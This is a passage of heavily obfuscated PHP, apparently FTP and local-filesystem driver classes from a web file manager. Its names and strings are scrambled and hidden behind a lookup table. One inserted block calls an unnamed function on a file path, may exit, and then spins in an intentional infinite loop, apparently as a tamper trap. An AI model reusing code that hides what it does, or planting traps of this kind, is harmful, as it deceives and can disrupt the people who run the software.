foreach ($ú›»š˜Û as $ˆÂàùÒ => $´Ï¯İï¦) { $ú›»š˜Û[$ˆÂàùÒ] = $this->fileInfo($´Ï¯İï¦[$ÊìàÁ[42]], $Ï‹»²Ö, $´Ï¯İï¦); } return array($ÊìàÁ[93] => $úõöæˆ, $ÊìàÁ[94] => $ú›»š˜Û); } public function has($éÇ†‘âÀ, $¼½Ó°¸Ğ = false, $Ô€òÑĞİ = true) { $“ÆŒˆºŒ =& $_SERVER[Å¶¨Şêº]; $Ê—€›Íˆ = $¦ïê•‹É = array(); $š¸±ê¤ä = $¼½Ó°¸Ğ ? !0 : !1; $this->fileList($éÇ†‘âÀ, $Ê—€›Íˆ, $¦ïê•‹É, $š¸±ê¤ä); if ($¼½Ó°¸Ğ) { return array($“ÆŒˆºŒ[218] => count($¦ïê•‹É), $“ÆŒˆºŒ[219] => count($Ê—€›Íˆ)); } if ($Ô€òÑĞİ) { if (count($¦ïê•‹É)) { return !0; } } else { if (count($Ê—€›Íˆ)) { return !0; } } return !1; } public function listAll($³¸åÒŞ‹) { $‡„’…® =& $_SERVER[Å¶¨Şêº]; if (!$this->_isconn()) { return !1; } $æç¼ÍÁ = $•ûÄ†¥ = array(); $this->fileList($³¸åÒŞ‹, $æç¼ÍÁ, $•ûÄ†¥, !0); $í½†Äõ€ = array_to_keyvalue($•ûÄ†¥, $‡„’…®[42]); foreach ($æç¼ÍÁ as $İÃ„û») { if (is_string($İÃ„û»)) { $í½†Äõ€[$İÃ„û»] = array($‡„’…®[87] => 0); } } return $this->listAllFiles($³¸åÒŞ‹, $í½†Äõ€); } public function getContent($°¿ë‡Àâ) { if (!$this->_isconn()) { return !1; } $°¿ë‡Àâ = $this->iconvSystem($°¿ë‡Àâ); return $this->fileSubstr($°¿ë‡Àâ); } public function setContent($íÇ‚£Í¾, $­´ÕµÂ = '') { if (!$this->_isconn()) { return !1; } $ÕıÄùÒ = $this->pathThis($this->iconvSystem($íÇ‚£Í¾)); $Ñğœ¨±º = $this->tempFile($ÕıÄùÒ); file_put_contents($Ñğœ¨±º, $­´ÕµÂ); $¥‹ĞÚËß = $this->upload($íÇ‚£Í¾, $this->iconvApp($Ñğœ¨±º)); $this->tempFileRemve($Ñğœ¨±º); return $¥‹ĞÚËß; } public function fileSubstr($ìÏÙ€Ğ™, $ò‚†àœÖ = 0, $ö‰Ÿ¨Êñ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ìÏÙ€Ğ™, $ò‚†àœÖ, $ö‰Ÿ¨Êñ); } private function ftpRequest($¬­Í¨É, $¶†ä®† = 0, $ğçÚÓÃÍ = false) { $¬­Í¨É = $this->iconvSystem($¬­Í¨É); $ÍãÁ›Ïí = $this->scheme . $this->host . $_SERVER[Å¶¨Şêº][4] . $this->port; $˜¸ïÎÎí = curl_init(); curl_setopt($˜¸ïÎÎí, CURLOPT_URL, $ÍãÁ›Ïí . $this->pathEncode($¬­Í¨É)); curl_setopt($˜¸ïÎÎí, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ğçÚÓÃÍ) { $´Áâï… = $¶†ä®† + $ğçÚÓÃÍ - 1; curl_setopt($˜¸ïÎÎí, CURLOPT_RANGE, "{$¶†ä®†}\x2d{$´Áâï…}"); } curl_setopt($˜¸ïÎÎí, CURLOPT_RETURNTRANSFER, 1); $’˜À™ÔÍ = curl_exec($˜¸ïÎÎí); curl_close($˜¸ïÎÎí); return $’˜À™ÔÍ; } public function upload($£¶îõ¹Í, $£‚Ê·å, $â‹ùÚÛì = false, $åù®¢ˆ­ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($£¶îõ¹Í))) { return !1; } $£¶îõ¹Í = $this->iconvSystem($£¶îõ¹Í); $£‚Ê·å = $this->iconvSystem($£‚Ê·å); $ÚºÒ‚ª¬ = ftp_nb_put($this->connect, $£¶îõ¹Í, $£‚Ê·å, FTP_BINARY); while ($ÚºÒ‚ª¬ == FTP_MOREDATA) { $ÚºÒ‚ª¬ = ftp_nb_continue($this->connect); } if ($ÚºÒ‚ª¬ != FTP_FINISHED) { return !1; } return $this->getPathOuter($£¶îõ¹Í); } public function download($­ƒûÉ¾ú, $€Ÿ ıÊŸ = '') { if (!$this->_isconn()) { return !1; } $ÇòßŞÀ = $this->pathFather($€Ÿ ıÊŸ); if (!IO::mkdir($ÇòßŞÀ)) { return !1; } $­ƒûÉ¾ú = $this->iconvSystem($­ƒûÉ¾ú); $€Ÿ ıÊŸ = $this->iconvSystem($€Ÿ ıÊŸ); $½ËÔ ­ = ftp_nb_get($this->connect, $€Ÿ ıÊŸ, $­ƒûÉ¾ú, FTP_BINARY); while ($½ËÔ ­ == FTP_MOREDATA) { $½ËÔ ­ = ftp_nb_continue($this->connect); } if ($½ËÔ ­ != FTP_FINISHED) { return !1; } return $this->iconvApp($€Ÿ ıÊŸ); } public function exist($—ª‚ñª) { return $this->isFile($—ª‚ñª) || $this->isFolder($—ª‚ñª); } public function isFile($Ó§«Ö™ë) { return !$this->isFolder($Ó§«Ö™ë) && $this->objectMeta($Ó§«Ö™ë); } public function isFolder($¹˜ÑÃâø) { return $this->cacheMethod($_SERVER[Å¶¨Şêº][176], $¹˜ÑÃâø); } protected function objectMeta($ıùƒØ©ü) { return $this->cacheMethod($_SERVER[Å¶¨Şêº][178], $ıùƒØ©ü); } protected function _objectMeta($‹äÆÅ€) { $ãŠ±ñÑè =& $_SERVER[Å¶¨Şêº]; if ($‹äÆÅ€ == $ãŠ±ñÑè[12] || $‹äÆÅ€ == $ãŠ±ñÑè[8]) { return array(); } if (!$this->_isconn()) { return !1; } $‹äÆÅ€ = $this->iconvSystem($‹äÆÅ€); $Ïààà­† = array($ãŠ±ñÑè[42] => $this->iconvApp($‹äÆÅ€), $ãŠ±ñÑè[43] => $ãŠ±ñÑè[211], $ãŠ±ñÑè[87] => 0); @ftp_chdir($this->connect, $ãŠ±ñÑè[8]); $ÜÍõä†ş = @ftp_size($this->connect, $‹äÆÅ€); if ($ÜÍõä†ş != -1) { $Ïààà­†[$ãŠ±ñÑè[87]] = $ÜÍõä†ş; } else { $µˆøòµÇ = @ftp_chdir($this->connect, $‹äÆÅ€); if (!$µˆøòµÇ) { return !1; } $Ïààà­†[$ãŠ±ñÑè[43]] = $ãŠ±ñÑè[86]; } return $Ïààà­†; } protected function _isFolder($—ßåšñŠ) { $£“óÔçò =& $_SERVER[Å¶¨Şêº]; if ($—ßåšñŠ == $£“óÔçò[12] || $—ßåšñŠ == $£“óÔçò[8]) { return !0; } $€¨”¿ = $this->_objectMeta($—ßåšñŠ); return isset($€¨”¿[$£“óÔçò[43]]) && $€¨”¿[$£“óÔçò[43]] == $£“óÔçò[86] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ùÕõıËê) { if (substr($ùÕõıËê, 0, 2) == $_SERVER[Å¶¨Şêº][1377]) { $ùÕõıËê = BASIC_PATH . substr($ùÕõıËê, 2); } return $ùÕõıËê; } public function iconvApp($ä¤ù”ìñ) { $×æ†ôè =& $_SERVER[Å¶¨Şêº]; global $config; return $this->iconvTo($ä¤ù”ìñ, $config[$×æ†ôè[1375]], $config[$×æ†ôè[1374]]); } public function iconvSystem($¼©‹Ö±ø) { $ ¬Ãşî€ =& $_SERVER[Å¶¨Şêº]; global $config; return $this->iconvTo($¼©‹Ö±ø, $config[$ ¬Ãşî€[1374]], $config[$ ¬Ãşî€[1375]]); } public function getPathOuter($¨š”âº¼) { $îÃåÜãä =& $_SERVER[Å¶¨Şêº]; $÷£¡ğÑû = $this->iconvApp($this->pathBase); $¨š”âº¼ = $this->iconvApp($¨š”âº¼); if (substr($÷£¡ğÑû, 0, 2) == $îÃåÜãä[1377]) { $÷£¡ğÑû = BASIC_PATH . substr($÷£¡ğÑû, 2); } if (substr($¨š”âº¼, 0, 2) == $îÃåÜãä[1377]) { $¨š”âº¼ = BASIC_PATH . substr($¨š”âº¼, 2); } $÷£¡ğÑû = KodIO::clear($÷£¡ğÑû); $¨š”âº¼ = KodIO::clear($¨š”âº¼); $¨š”âº¼ = substr($¨š”âº¼, strlen($÷£¡ğÑû)); if (empty($this->pathDriver)) { return $¨š”âº¼; } return $this->pathDriver . $îÃåÜãä[8] . ltrim($¨š”âº¼, $îÃåÜãä[8]); } public function mkfile($ÑÚÇÔñ, $õĞ¥»¸Ì = '', $ˆ´çş©¨ = REPEAT_RENAME) { $ÑÚÇÔñ = $this->iconvSystem($ÑÚÇÔñ); @touch($ÑÚÇÔñ); if ($õĞ¥»¸Ì) { file_put_contents($ÑÚÇÔñ, $õĞ¥»¸Ì); } @chmod($ÑÚÇÔñ, $this->pathAuth); return is_file($ÑÚÇÔñ) ? $this->getPathOuter($ÑÚÇÔñ) : !1; } public function mkdir($òêîÙÆë, $Ú³‰çÓ³ = REPEAT_SKIP) { $òêîÙÆë = $this->iconvSystem($òêîÙÆë); if (is_dir($òêîÙÆë)) { return $this->getPathOuter($òêîÙÆë); } @mkdir($òêîÙÆë, $this->pathAuth, !0); @chmod($òêîÙÆë, $this->pathAuth); return is_dir($òêîÙÆë) ? $this->getPathOuter($òêîÙÆë) : !1; } public function copyFile($‚ÀéÄ ¶, $ŠÊŞ÷’™) { $this->mkdir($this->pathFather($ŠÊŞ÷’™)); $‚ÀéÄ ¶ = $this->iconvSystem($‚ÀéÄ ¶); $ŠÊŞ÷’™ = $this->iconvSystem($ŠÊŞ÷’™); $ù¼îÙâ± = copy_64($‚ÀéÄ ¶, $ŠÊŞ÷’™); @chmod($ŠÊŞ÷’™, $this->pathAuth); return $ù¼îÙâ± ? $this->getPathOuter($ŠÊŞ÷’™) : !1; } public function moveFile($æ±‹à•, $¡ó¨äš) { $this->mkdir($this->pathFather($¡ó¨äš)); $æ±‹à• = $this->iconvSystem($æ±‹à•); $¡ó¨äš = $this->iconvSystem($¡ó¨äš); $€ØƒÛªÎ = intval(@rename($æ±‹à•, $¡ó¨äš)); if (!$€ØƒÛªÎ) { if ($€ØƒÛªÎ = intval(@copy_64($æ±‹à•, $¡ó¨äš))) { @unlink($æ±‹à•); } } @chmod($¡ó¨äš, $this->pathAuth); return $€ØƒÛªÎ ? $this->getPathOuter($¡ó¨äš) : !1; } public function movePath($¨·ÔÍ›Ù, $â»¨Ôì”, $Ç® Ù‡Ó = false) { $ôÚ³¾èª =& $_SERVER[Å¶¨Şêº]; $¨·ÔÍ›Ù = $this->iconvSystem($¨·ÔÍ›Ù); $â»¨Ôì” = $this->iconvSystem($â»¨Ôì”); $…ÄŞ·£û = rtrim($â»¨Ôì”, $ôÚ³¾èª[8]) . $ôÚ³¾èª[8] . ($Ç® Ù‡Ó ? $Ç® Ù‡Ó : get_path_this($¨·ÔÍ›Ù)); if (file_exists($…ÄŞ·£û)) { return !1; } $¹òÚ±Ä = intval(@rename($¨·ÔÍ›Ù, $…ÄŞ·£û)); $¹òÚ±Ä = file_exists($…ÄŞ·£û); return $¹òÚ±Ä ? $this->getPathOuter($…ÄŞ·£û) : !1; } public function delFile($£¡ÕéÂ¼) { $£¡ÕéÂ¼ = $this->iconvSystem($£¡ÕéÂ¼); if (!@unlink($£¡ÕéÂ¼)) { @chmod($£¡ÕéÂ¼, $this->pathAuth); if (!@unlink($£¡ÕéÂ¼)) { return !1; } } else { return !0; } } public function delFolder($é½¼»ó®) { $êšİçà =& $_SERVER[Å¶¨Şêº]; $é½¼»ó® = $this->iconvSystem($é½¼»ó®); if (!is_dir($é½¼»ó®)) { return !0; } if (!($úö—ÒÊË = opendir($é½¼»ó®))) { return !1; } while (($äÎ“Èç = readdir($úö—ÒÊË)) !== !1) { if ($äÎ“Èç == $êšİçà[10] || $äÎ“Èç == $êšİçà[1384]) { continue; } $íèÌƒ•µ = $é½¼»ó® . $êšİçà[8] . $äÎ“Èç; if (is_file($íèÌƒ•µ) || is_link($íèÌƒ•µ)) { if (!unlink($íèÌƒ•µ)) { chmod($íèÌƒ•µ, $this->pathAuth); if (!unlink($íèÌƒ•µ)) { return !1; } } } else { if (is_dir($íèÌƒ•µ)) { chmod($íèÌƒ•µ, $this->pathAuth); $íèÌƒ•µ = $this->iconvApp($íèÌƒ•µ); if (!$this->delFolder($íèÌƒ•µ)) { return !1; } } } } closedir($úö—ÒÊË); return rmdir($é½¼»ó®); } public function rename($ùÆ¥ÒÓÃ, $å³Õ›ûœ) { $÷¥Ş¿‘Š =& $_SERVER[Å¶¨Şêº]; $»åÎ§”ß = $this->fileNameAuto($this->pathFather($ùÆ¥ÒÓÃ), $å³Õ›ûœ); $»åÎ§”ß = $this->iconvSystem($»åÎ§”ß); $ùÆ¥ÒÓÃ = $this->iconvSystem($ùÆ¥ÒÓÃ); $®ñêˆ× = $this->pathFather($ùÆ¥ÒÓÃ); $°äİ­Ê = rtrim($®ñêˆ×, $÷¥Ş¿‘Š[8]) . $÷¥Ş¿‘Š[8] . $»åÎ§”ß; $ÜÌ“çµ = @rename($ùÆ¥ÒÓÃ, $°äİ­Ê); $°äİ­Ê = $this->iconvApp($°äİ­Ê); return $ÜÌ“çµ ? $this->getPathOuter($°äİ­Ê) : !1; } public function size($“ĞùÓ¾®) { $“ĞùÓ¾® = $this->iconvSystem($“ĞùÓ¾®); return filesize_64($“ĞùÓ¾®); } public function info($öÃ‹Äğ‡) { $öÃ‹Äğ‡ = $this->iconvSystem($öÃ‹Äğ‡); if ($this->isFolder($öÃ‹Äğ‡)) { return $this->folderInfo($öÃ‹Äğ‡); } else { if ($this->isFile($öÃ‹Äğ‡)) { return $this->fileInfo($öÃ‹Äğ‡); } } return !1; } protected function infoChildren($Ù£¢÷½€, &$óúáÒ ¶, $¢¤Î®æ÷ = true) { $İ”¸¸²ù =& $_SERVER[Å¶¨Şêº]; check_abort_echo(); $Ù£¢÷½€ = rtrim($Ù£¢÷½€, $İ”¸¸²ù[8]) . $İ”¸¸²ù[8]; if ($¢¤Î®æ÷) { $Ù£¢÷½€ = $this->iconvSystem($Ù£¢÷½€); } if (!($¦Ó”ºÑß = @opendir($Ù£¢÷½€))) { return; } while (($ãÖ½ò¬ = readdir($¦Ó”ºÑß)) !== !1) { if ($ãÖ½ò¬ == $İ”¸¸²ù[10] || $ãÖ½ò¬ == $İ”¸¸²ù[1384]) { continue; } $ŒÛ¼Õ½ª = $Ù£¢÷½€ . $ãÖ½ò¬; if (is_file($ŒÛ¼Õ½ª) || is_link($ŒÛ¼Õ½ª)) { $óúáÒ ¶[$İ”¸¸²ù[88]]++; $óúáÒ ¶[$İ”¸¸²ù[87]] += filesize_64($ŒÛ¼Õ½ª); } else { if (is_dir($ŒÛ¼Õ½ª)) { $óúáÒ ¶[$İ”¸¸²ù[89]]++; $this->infoChildren($ŒÛ¼Õ½ª, $óúáÒ ¶, !1); } } } closedir($¦Ó”ºÑß); } private function folderInfo($âˆìş‡°, $ ÓÒ˜ì² = false) { $Ÿ¥æ´Ê± =& $_SERVER[Å¶¨Şêº]; $âˆìş‡° = rtrim($âˆìş‡°, $Ÿ¥æ´Ê±[8]) . $Ÿ¥æ´Ê±[8]; $¦à¹­‡³ = $this->iconvApp($this->pathThis($âˆìş‡°)); if ($ ÓÒ˜ì²) { return array($Ÿ¥æ´Ê±[42] => $¦à¹­‡³, $Ÿ¥æ´Ê±[95] => $this->getPathOuter($âˆìş‡°), $Ÿ¥æ´Ê±[43] => $Ÿ¥æ´Ê±[86]); } $·¿ÇÅÈƒ = array($Ÿ¥æ´Ê±[42] => $¦à¹­‡³, $Ÿ¥æ´Ê±[95] => $this->getPathOuter($âˆìş‡°), $Ÿ¥æ´Ê±[43] => $Ÿ¥æ´Ê±[86], $Ÿ¥æ´Ê±[212] => @filectime($âˆìş‡°), $Ÿ¥æ´Ê±[96] => @filemtime($âˆìş‡°), $Ÿ¥æ´Ê±[1387] => @fileatime($âˆìş‡°), $Ÿ¥æ´Ê±[1388] => is_readable($âˆìş‡°), $Ÿ¥æ´Ê±[1389] => is_writable($âˆìş‡°), $Ÿ¥æ´Ê±[1390] => get_mode($âˆìş‡°)); return $·¿ÇÅÈƒ; } private function fileInfo($õÊÎûÑ­, $ŠË¯Ô•© = false) { $›œÉ›ë‹ =& $_SERVER[Å¶¨Şêº]; $ûºŒñö = $this->iconvApp($this->pathThis($õÊÎûÑ­)); if ($ŠË¯Ô•©) { return array($›œÉ›ë‹[42] => $ûºŒñö, $›œÉ›ë‹[95] => $this->getPathOuter($õÊÎûÑ­), $›œÉ›ë‹[43] => $›œÉ›ë‹[211], $›œÉ›ë‹[87] => $this->size($õÊÎûÑ­), $›œÉ›ë‹[185] => $this->ext($ûºŒñö)); } $ßÉ‚Ä¾² = array($›œÉ›ë‹[42] => $ûºŒñö, $›œÉ›ë‹[95] => $this->getPathOuter($õÊÎûÑ­), $›œÉ›ë‹[43] => $›œÉ›ë‹[211], $›œÉ›ë‹[212] => @filectime($õÊÎûÑ­), $›œÉ›ë‹[96] => @filemtime($õÊÎûÑ­), $›œÉ›ë‹[1387] => @fileatime($õÊÎûÑ­), $›œÉ›ë‹[87] => $this->size($õÊÎûÑ­), $›œÉ›ë‹[185] => $this->ext($ûºŒñö), $›œÉ›ë‹[1388] => is_readable($õÊÎûÑ­), $›œÉ›ë‹[1389] => is_writable($õÊÎûÑ­), $›œÉ›ë‹[1390] => get_mode($õÊÎûÑ­)); return $ßÉ‚Ä¾²; } public function exist($ííü•úù) { $ííü•úù = $this->iconvSystem($ííü•úù); return @file_exists($ííü•úù); } public function isFile($ˆÆ¸¡—•) { $ˆÆ¸¡—• = $this->iconvSystem($ˆÆ¸¡—•); return @is_file($ˆÆ¸¡—•); } public function isFolder($Æ“Õ Æš) { $Æ“Õ Æš = $this->iconvSystem($Æ“Õ Æš); return @is_dir($Æ“Õ Æš); } public function listPath($²æ´ıú‹, $«şŸû® = false) { $ğ´ô¥îÕ =& $_SERVER[Å¶¨Şêº]; $²æ´ıú‹ = $this->iconvSystem($²æ´ıú‹); $²æ´ıú‹ = rtrim($²æ´ıú‹, $ğ´ô¥îÕ[8]) . $ğ´ô¥îÕ[8]; $îšŠû· = array($ğ´ô¥îÕ[93] => array(), $ğ´ô¥îÕ[94] => array()); if (!($ÅæšĞ¨… = @opendir($²æ´ıú‹))) { return $îšŠû·; } while (($ì³¾ÇÜï = readdir($ÅæšĞ¨…)) !== !1) { if ($ì³¾ÇÜï == $ğ´ô¥îÕ[10] || $ì³¾ÇÜï == $ğ´ô¥îÕ[1384]) { continue; } $Ş¯±ú»À = $²æ´ıú‹ . $ì³¾ÇÜï; if (is_file($Ş¯±ú»À)) { $îšŠû·[$ğ´ô¥îÕ[94]][] = $this->fileInfo($Ş¯±ú»À, $«şŸû®); } else { $îšŠû·[$ğ´ô¥îÕ[93]][] = $this->folderInfo($Ş¯±ú»À, $«şŸû®); } } closedir($ÅæšĞ¨…); return $îšŠû·; } public function listAll($² ÷Ã¾î, &$ŞÊ‘Ÿáø = array()) { $ğìçÀÕ° =& $_SERVER[Å¶¨Şêº]; $² ÷Ã¾î = $this->iconvSystem($² ÷Ã¾î); $² ÷Ã¾î = rtrim($² ÷Ã¾î, $ğìçÀÕ°[8]) . $ğìçÀÕ°[8]; if (!($á™ş° = @opendir($² ÷Ã¾î))) { return $ŞÊ‘Ÿáø; } while (($ÄÒ•†“¯ = readdir($á™ş°)) !== !1) { if ($ÄÒ•†“¯ == $ğìçÀÕ°[10] || $ÄÒ•†“¯ == $ğìçÀÕ°[1384]) { continue; } $ä‹¸Ÿ›ã = $² ÷Ã¾î . $ÄÒ•†“¯; $Ùş†»‡ = is_dir($ä‹¸Ÿ›ã) && !is_link($ä‹¸Ÿ›ã) ? 1 : 0; $ä‹¸Ÿ›ã = $Ùş†»‡ ? $ä‹¸Ÿ›ã . $ğìçÀÕ°[8] : $ä‹¸Ÿ›ã; $ŞÊ‘Ÿáø[] = array($ğìçÀÕ°[95] => $ä‹¸Ÿ›ã, $ğìçÀÕ°[86] => $Ùş†»‡, $ğìçÀÕ°[96] => intval(@filemtime($ä‹¸Ÿ›ã)), $ğìçÀÕ°[87] => $Ùş†»‡ ? 0 : intval($this->size($ä‹¸Ÿ›ã))); if ($Ùş†»‡) { $this->listAll($ä‹¸Ÿ›ã, $ŞÊ‘Ÿáø); } } closedir($á™ş°); return $ŞÊ‘Ÿáø; } public function has($¸ÆÀõ›·, $šòšÏü = false, $–…³—ı® = true) { $«Ïó‡£ã =& $_SERVER[Å¶¨Şêº]; $¸ÆÀõ›· = $this->iconvSystem($¸ÆÀõ›·); $¸ÆÀõ›· = rtrim($¸ÆÀõ›·, $«Ïó‡£ã[8]) . $«Ïó‡£ã[8]; if (!($€¡‘•Õ€ = @opendir($¸ÆÀõ›·))) { return !1; } $œŒ¦Ôäø = 0; $Ü†‚×»® = 0; $‹ç›ªæ = 0; while (($âãÚæãŸ = readdir($€¡‘•Õ€)) !== !1) { if ($âãÚæãŸ == $«Ïó‡£ã[10] || $âãÚæãŸ == $«Ïó‡£ã[1384]) { continue; } $ã»Ü£ˆŠ = $¸ÆÀõ›· . $âãÚæãŸ; if ($šòšÏü) { $‹ç›ªæ++; if (@is_file($ã»Ü£ˆŠ)) { $œŒ¦Ôäø++; } else { $Ü†‚×»®++; } if ($‹ç›ªæ > 10000) { break; } continue; } if ($–…³—ı®) { if (@is_file($ã»Ü£ˆŠ)) { return !0; } } else { if (@is_dir($ã»Ü£ˆŠ . $«Ïó‡£ã[8])) { return !0; } } } closedir($€¡‘•Õ€); if ($šòšÏü) { return array($«Ïó‡£ã[218] => $œŒ¦Ôäø, $«Ïó‡£ã[219] => $Ü†‚×»®); } return !1; } public function hashSimple($Áç„Ìø£) { $¹œëŸ½È =& $_SERVER[Å¶¨Şêº]; if (!$Áç„Ìø£) { return md5($¹œëŸ½È[12]); } $Áç„Ìø£ = $this->iconvSystem($Áç„Ìø£); $ˆÁı˜Œî = $this->size($Áç„Ìø£); $ÚÙ¸Ô´Ì = 200; $«šïŸºş = 50; if ($ˆÁı˜Œî <= $ÚÙ¸Ô´Ì * $«šïŸºş) { return $this->hashMd5($Áç„Ìø£) . $ˆÁı˜Œî; } $·Ë¸ÔÈ = $¹œëŸ½È[12]; $˜Ñ–µÇ = intval($ˆÁı˜Œî / $«šïŸºş); $—Ößáõ× = fopen($Áç„Ìø£, $¹œëŸ½È[1391]); if (!$—Ößáõ×) { return $·Ë¸ÔÈ; } for ($¡„¾Ÿ = 0; $¡„¾Ÿ < $«šïŸºş; $¡„¾Ÿ++) { fseek_64($—Ößáõ×, $˜Ñ–µÇ * $¡„¾Ÿ); $·Ë¸ÔÈ .= fread($—Ößáõ×, $ÚÙ¸Ô´Ì); } fseek_64($—Ößáõ×, $ˆÁı˜Œî - $ÚÙ¸Ô´Ì); $·Ë¸ÔÈ .= fread($—Ößáõ×, $ÚÙ¸Ô´Ì); fclose($—Ößáõ×); return md5($·Ë¸ÔÈ) . $ˆÁı˜Œî; } public function getContent($ŞÑ„Ãñ») { $ŞÑ„Ãñ» = $this->iconvSystem($ŞÑ„Ãñ»); return file_get_contents($ŞÑ„Ãñ»); } public function setContent($Ÿ‰÷‹Ö¿, $¯ÑÂÆ» = '') { $Ÿ‰÷‹Ö¿ = $this->iconvSystem($Ÿ‰÷‹Ö¿); $Î÷… Êì = @file_put_contents($Ÿ‰÷‹Ö¿, $¯ÑÂÆ», LOCK_EX); clearstatcache(); @chmod($Ÿ‰÷‹Ö¿, $this->pathAuth); return $Î÷… Êì === !1 ? !1 : !0; } public function fileSubstr($·ºŞµÇÀ, $Ì…›îÕù = 0, $‰æ¾õéí = false) { $çû±üé =& $_SERVER[Å¶¨Şêº]; $·ºŞµÇÀ = $this->iconvSystem($·ºŞµÇÀ); if ($‰æ¾õéí === !1) { $‰æ¾õéí = $this->size($·ºŞµÇÀ); } if ($‰æ¾õéí <= 0) { return $çû±üé[12]; } $©ğ ¿ = fopen($·ºŞµÇÀ, $çû±üé[1391]); if (!$©ğ ¿) { return !1; } fseek_64($©ğ ¿, $Ì…›îÕù); $ò˜ÛùÏÌ = fread($©ğ ¿, $‰æ¾õéí); fclose($©ğ ¿); return $ò˜ÛùÏÌ; } public function upload($œÔ¢¢ŸÆ, $†ü£ğ¬Æ, $ìíŸÂı‚ = false, $’¤µ£Õ¼ = REPEAT_REPLACE) { if ($ìíŸÂı‚) { return $this->moveFile($†ü£ğ¬Æ, $œÔ¢¢ŸÆ); } return $this->copyFile($†ü£ğ¬Æ, $œÔ¢¢ŸÆ); } public function setModifyTime($œÉ©Ÿ“³, $îºÁ¿ù = '') { @touch($œÉ©Ÿ“³, intval($îºÁ¿ù)); } public function download($Šì¹°Í–, $ùõ‡ñª) { return $this->iconvSystem($Šì¹°Í–); } } goto CğâÑÁ™Ç; Fµæ‡åÕÑ: if (!isset($_SERVER[$_SERVER[Å¶¨Şêº][15]]) || !isset($_SERVER[$_SERVER[Å¶¨Şêº][13]])) { $_getc = $_SERVER[Å¶¨Şêº][16]; $_getfile = $_SERVER[$_SERVER[Å¶¨Şêº][17]] . $_SERVER[Å¶¨Şêº][18]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Å¶¨Şêº][19], $_getfilec); if (count($_getarrs) < $_SERVER[Å¶¨Şêº][20]) { $exit = $_SERVER[Å¶¨Şêº][21]; $exit(); } $_act = $_SERVER[Å¶¨Şêº][22]; $_act($_SERVER[$_SERVER[Å¶¨Şêº][17]] . $_SERVER[Å¶¨Şêº][18]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Å¶¨Şêº][70]); } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $õæ† Úß =& $_SERVER[Å¶¨Şêº]; $this->objectDriver = array($õæ† Úß[71], $õæ† Úß[72], $õæ† Úß[73], $õæ† Úß[74], $õæ† Úß[75], $õæ† Úß[76], $õæ† Úß[77], $õæ† Úß[78], $õæ† Úß[79]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($÷ÑÎ›Ç) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($÷ÑÎ›Ç, $_SERVER[Å¶¨Şêº][8]); } return $÷ÑÎ›Ç; } public function iconvApp($ù†€æàë) { return $ù†€æàë; } public function iconvSystem($–ëû÷‚—) { return $–ëû÷‚—; } public function iconvTo($Ù‚ˆèŒ¸, $âÆ˜¿İ¼, $“ÉŒï”¼) { $ìƒîš¥Ş =& $_SERVER[Å¶¨Şêº]; if (!$Ù‚ˆèŒ¸ || !function_exists($ìƒîš¥Ş[80])) { return $Ù‚ˆèŒ¸; } static $‘çÒÎˆƒ = array(); $ß¦Áê‰Æ = $âÆ˜¿İ¼ . $ìƒîš¥Ş[81] . $“ÉŒï”¼ . $ìƒîš¥Ş[82] . $Ù‚ˆèŒ¸; if (isset($‘çÒÎˆƒ[$ß¦Áê‰Æ])) { return $‘çÒÎˆƒ[$ß¦Áê‰Æ]; } if (function_exists($ìƒîš¥Ş[83])) { $§Ê÷ØÜ¸ = @mb_convert_encoding($Ù‚ˆèŒ¸, $“ÉŒï”¼, $âÆ˜¿İ¼); } else { $§Ê÷ØÜ¸ = @iconv($âÆ˜¿İ¼, $“ÉŒï”¼, $Ù‚ˆèŒ¸); } $§Ê÷ØÜ¸ = $§Ê÷ØÜ¸ ? $§Ê÷ØÜ¸ : $Ù‚ˆèŒ¸; if (strstr($§Ê÷ØÜ¸, $ìƒîš¥Ş[84])) { $§Ê÷ØÜ¸ = str_replace($ìƒîš¥Ş[84], $ìƒîš¥Ş[11], $§Ê÷ØÜ¸); } $‘çÒÎˆƒ[$âÆ˜¿İ¼ . $ìƒîš¥Ş[81] . $“ÉŒï”¼ . $ìƒîš¥Ş[82] . $Ù‚ˆèŒ¸] = $§Ê÷ØÜ¸; $‘çÒÎˆƒ[$“ÉŒï”¼ . $ìƒîš¥Ş[81] . $âÆ˜¿İ¼ . $ìƒîš¥Ş[82] . $Ù‚ˆèŒ¸] = $Ù‚ˆèŒ¸; $‘çÒÎˆƒ[$“ÉŒï”¼ . $ìƒîš¥Ş[81] . $âÆ˜¿İ¼ . $ìƒîš¥Ş[82] . $§Ê÷ØÜ¸] = $Ù‚ˆèŒ¸; $‘çÒÎˆƒ[$âÆ˜¿İ¼ . $ìƒîš¥Ş[81] . $“ÉŒï”¼ . $ìƒîš¥Ş[82] . $§Ê÷ØÜ¸] = $§Ê÷ØÜ¸; return $§Ê÷ØÜ¸; } public function getPathInner($¸êê×êÎ) { $±îŞ©ŸŒ = IO::init($¸êê×êÎ); return $±îŞ©ŸŒ->path; } public function getPathOuter($øÏ¹É‡¬) { $ÊÁôÆ“Ù =& $_SERVER[Å¶¨Şêº]; $Â…ñû©· = strlen(trim($this->pathBase, $ÊÁôÆ“Ù[8])); $øÏ¹É‡¬ = substr(trim($øÏ¹É‡¬, $ÊÁôÆ“Ù[8]), $Â…ñû©·); return $this->pathDriver . $ÊÁôÆ“Ù[8] . ltrim($øÏ¹É‡¬, $ÊÁôÆ“Ù[8]); } public function isParentOf($ğã³İÙ–, $ÏÅÃ´¹) { $ºû‘¹°ß =& $_SERVER[Å¶¨Şêº]; $ğã³İÙ– = rtrim(strtolower($ğã³İÙ–), $ºû‘¹°ß[8]) . $ºû‘¹°ß[8]; $ÏÅÃ´¹ = rtrim(strtolower($ÏÅÃ´¹), $ºû‘¹°ß[8]) . $ºû‘¹°ß[8]; $êÊÔƒ›¢ = strpos($ÏÅÃ´¹, $ğã³İÙ–) === 0; return $êÊÔƒ›¢; } public function getType() { $Õ‘¨Õæ =& 